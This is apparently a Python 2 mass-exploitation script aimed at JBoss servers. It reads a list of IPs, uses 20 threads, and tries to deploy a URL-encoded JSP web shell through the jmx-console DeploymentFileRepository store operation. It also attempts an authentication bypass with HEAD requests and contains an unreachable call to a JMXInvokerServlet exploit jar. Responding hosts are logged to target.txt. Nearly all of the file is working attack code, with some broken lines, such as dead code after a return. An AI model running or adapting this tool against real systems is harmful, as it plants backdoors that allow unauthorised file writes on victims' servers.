#!/usr/bin/env python
# -*- coding:utf-8 -*-

# jmx-console和JMXInvokerServlet verify

import requests
import commands
import sys
import urllib2
from Queue import Queue
import threading

url_queue = Queue()
jmx_console_vul_queue = Queue()
jmx_invoker_servlet_vul_queue = Queue()
THREAD_NUM = 20
vul_url_txt = open("target.txt","w")

class Jboss:
    def __init__(self):
        self.file_name = "t2stj60ss"
        self.headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
        }

    def set_url(self,url):
    	self.url = url

    def output(self,msg):
        print msg
        exit(0)

    def jmxconsole(self):
        # print "Checking jmx console"
        shell_content = "%3c%25if(request%2egetParameter(%22f%22)!%3dnull)(new+java%2eio%2eFileOutputStream(application%2egetRealPath(%22%2f%22)%2brequest%2egetParameter(%22f%22)))%2ewrite(request%2egetParameter(%22t%22)%2egetBytes())%3b%25%3ec4ca4238a0b923820dcc509a6f75849b"
        payload = payload = "?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=" + self.file_name + ".war&argType=java.lang.String&arg1=" + self.file_name + "&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + shell_content + "&argType=boolean&arg4=True"
        vul_url = self.url + '/jmx-console/HtmlAdaptor' + payload
        # print vul_url
        try:
            rep = requests.get(vul_url,headers = self.headers,timeout = 5)
            payload_code = rep.status_code
            if rep.status_code == 200:
                return True
            elif rep.status_code == 401:
                return self.bypass_auth()
        except Exception,e:
            # print e
            pass
            return False
        return False

    def jmxInvokerServlet(self):
        vul_url = self.url + "/invoker/JMXInvokerServlet"
        try:
            rep = requests.get(vul_url,headers = self.headers,timeout=5)
            if rep.status_code == 200:
                
                return True
                res = commands.getoutput("java -jar jboss_exploit_fat.jar -i " + vul_url + " invoke jboss.admin:service=DeploymentFileRepository store " + self.file_name + ".war " + self.file_name + " .jsp $content$ true -s java.lang.String;java.lang.String;java.lang.String;java.lang.String;java.lang.Boolean",shell=True)
                if res.find('jboss') < 0 and res.find('Exception') < 0 and res.find('exception') < 0 and res.find('Failed') < 0 and res.find('Mismatch') < 0 and res.find('not found') < 0:
                    print res
                    return True
                else:
                    print res
                    return False
        except Exception, e:
            pass
            return False
        return False

    def bypass_auth(self):
        shell_content = "%3c%25if(request%2egetParameter(%22f%22)!%3dnull)(new+java%2eio%2eFileOutputStream(application%2egetRealPath(%22%2f%22)%2brequest%2egetParameter(%22f%22)))%2ewrite(request%2egetParameter(%22t%22)%2egetBytes())%3b%25%3ec4ca4238a0b923820dcc509a6f75849b"
        payload = payload = "?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=" + self.file_name + ".war&argType=java.lang.String&arg1=" + self.file_name + "&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + shell_content + "&argType=boolean&arg4=True"
        vul_url = self.url + '/jmx-console/HtmlAdaptor' + payload
        try:
            opener = urllib2.build_opener(urllib2.HTTPHandler)
            request = urllib2.Request(vul_url)
            request.add_header("User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36")
            request.get_method = lambda: 'HEAD'
            opener.open(request,timeout = 5)
            if request.status == 200:
                return True
        except Exception,e:
            pass
            return False
        return False

class testTarget(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        global url_queue
        global THREAD_NUM
        jboss = Jboss()
        while not url_queue.empty():
            ip = url_queue.get()
            print "Checking http://" + ip + "/"
            jboss.set_url("http://" + ip + "/")
            if jboss.jmxconsole():
                print ip + " is vulnerable (JmxConsole)"
                jmx_console_vul_queue.put(ip)
            elif jboss.jmxInvokerServlet():
                print ip + " found (JmxInvokerServlet)"
                jmx_invoker_servlet_vul_queue.put(ip)

def test():
    threads = []
    for i in range(THREAD_NUM):
        t = testTarget()
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == '__main__':
    ip_txt = open("vul_ip.txt","r")
    for line in ip_txt:
        url_queue.put(line.strip("\n"))
    ip_txt.close()
    test()

    vul_url_txt.write("JMX-console:\n")
    while not jmx_console_vul_queue.empty():
        vul_url_txt.write(jmx_console_vul_queue.get() + "\n")

    vul_url_txt.write("Invoker Servlet:\n")
    while not jmx_invoker_servlet_vul_queue.empty():
        vul_url_txt.write(jmx_invoker_servlet_vul_queue.get() + "\n")

    vul_url_txt.close()